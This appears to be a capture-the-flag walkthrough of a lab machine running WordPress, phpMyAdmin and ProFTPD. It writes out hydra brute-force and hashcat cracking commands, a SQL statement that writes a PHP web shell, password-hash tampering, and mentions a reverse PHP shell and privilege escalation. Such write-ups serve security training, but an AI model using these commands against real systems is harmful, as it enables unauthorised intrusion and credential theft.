# Solution

Start with a nmap scan as usual
```
nmap -sC -sV -oN nmap-initial 10.10.10.37
```

We have a wordpress website. We use wpscan to enumerate.  
We run gobuster in background to scan for directories.  
We go in the wordpress login page and try to enumerate the users using hydra. While the enumeration is running, we focus on other services.  
```
hydra -L /usr/share/wordlists/rockyou.txt -p password 10.10.10.37 -v http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&redirect_to=http%3A%2F%2F10.10.10.37%2Fwp-admin%2F&wp-submit=Log In&testcookie=1:invalid username'
```
---
We focus the attention on the profptd service. Version 1.3.5 has vulnerabilities, it allows unauthenticated users to use SITE CPFR and SITE CPTO. Metasploit offers exploit to it as well as Exploit DB. First we try to see if it is actually vulnerable:
```
ftp 10.10.10.37
```
We log in with random credentials.  
Surprisingly when we try to use the CPFR command we are required to be authenticated.
```
ftp> site cpfr /etc/passwd
530 Please login with USER and PASS
```
Therefore it seems that it is not vulnerable.  

---
We switch our focus on the webserver.  Hydra hasn't found anything interesting. 

Run nikto
```
nikto -host 10.10.10.37 -output nikto.txt
```

We run gobuster and we find some directories:
```
/wiki (Status: 301)
/wp-content (Status: 301)
/plugins (Status: 301)
/wp-includes (Status: 301)
/javascript (Status: 301)
/wp-admin (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
```

We browse some of them. In plugins we find 2 .jar archives. We download them and we focus on BlockyCore.jar.
We extract it and we find a .class file. We can see the human readable characters in the .class file:
```
> strings BlockyCore.class
com/myfirstplugin/BlockyCore
java/lang/Object
sqlHost
Ljava/lang/String;
sqlUser
sqlPass
<init>
Code
        localhost
root
8YsqfCTnvxAUeduzjNSXe22
LineNumberTable
LocalVariableTable
this
Lcom/myfirstplugin/BlockyCore;
onServerStart
onServerStop
onPlayerJoin
TODO get username
!Welcome to the BlockyCraft!!!!!!!
sendMessage
'(Ljava/lang/String;Ljava/lang/String;)V
username
message
SourceFile
BlockyCore.java
```
We have an interesting hex string: 8YsqfCTnvxAUeduzjNSXe22.  
We try to use it in the ssh login with the root user but it doesn't work. We try in the wordpress login page but it doesn't work as well.  
We try in the phpmyadmin page with root username and it works. We are inside the phpmyadmin panel.

Now we want to get access to the underlying OS. We first try using SQL by uploading a file with a backdoor.
```
SELECT '<?php system($_GET["cmd"]);?>' into outfile "/var/www/shell.php";
```
However we get this error
```
The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```
which means that cannot write to that location. We want to figure out if we have write access on some directories. We can do this by looking at the value of the option "secure_file_priv"
```
SHOW VARIABLES LIKE "secure_file_priv" 
```
The value returned is /var/lib/mysql-files/ . Therefore we know that we can write to the directory /var/lib/mysql-files/.   
We change the command to inject in the file since the file will not be visible in the web browser. We run the following test to see if we can potentially inject a backdoor (10.10.14.25 is the address of my local machine):  
```
SELECT 'ping -c 1 10.10.14.25' into outfile "/var/lib/mysql-files/ping.sh"
```
We will use the LOAD DATA INFILE command to try to execute the script.  
We can set up tcpdump locally and check whether the ping is working.
```
tcpdump -i tun0 'icmp or icmp6'
```

Now we can try to start the ping.
```
LOAD DATA INFILE('/var/lib/mysql-files/ping.sh')
```
We don't receive answer.  
I try another way. From phpmyadmin we can see that one of the user is 'notch'. We also have the hash of his password. In background we set up the password bruteforce using wpscan:
```
wpscan --url http://10.10.10.37 -U notch -P /usr/share/wordlists/rockyou.txt
```

And we also look for the hash crack. The hash is
```
$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/
```
We can use hashcat to crack it. The hash is a portable php hash. We have to find the right mode in hashcat. We can do it in the following way:
```
>hashcat --example-hashes | grep -A 2 -B 2 php

MODE: 400
TYPE: phpass
HASH: $P$946647711V1klyitUYhtB8Yw5DMA/w.
PASS: hashcat
```
We see hat the hash format actually matches. We now know that the mode is 400.  
We can proceed to crack it. We go for 
```
hashcat -m 400 -a 0 hash.txt  /usr/share/wordlists/rockyou.txt
```
Meanwhile we can try to change the password with a hash generated by us and see if we can actually log in ( we leave hashcat working, hoping that the we can retrieve the notch ssh password once the hash got cracked).  
We take the string "ciao" and we hash it using portable php hash and we get the hash :
```
$P$BthUuP2pHNnXtMpSjXC2PkhuraA1/J/
```
Now we can go in phpmyadmin and change the password for the user 'notch'. Then we can go in the login page of wordpress and try to login using username 'notch' and password 'ciao'.  
It works, we can enter the wordpress portal.  

We want to execute php from wordpress. We install the plugin PHP code snippet. Thanks to that we can add php to our pages. We can get a shell by uploading the pentestmonkey reverse PHP shell.  
We have now a shell, it runs under the user www-data.  
We import a bash shell with python:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

We transfer and run LinPeas and LinEnum, execute them and study the results to find a way to escalate the privileges.  

---

Looking back at hashcat, we couldn't crack the hash. We try again to SSH into the box using root and 8YsqfCTnvxAUeduzjNSXe22, doubtfull whether We've already tried it or not (Yes we did). This time we also tried with the notch user and the same password. We had no expectations but it actually worked ... We could have solved the box at least some hours before... 

We thus get the user flag. Final step is retrieving the root flag by escalating the privileges.  
This is easy done by logging in as root (sudo -i) with the notch user password.
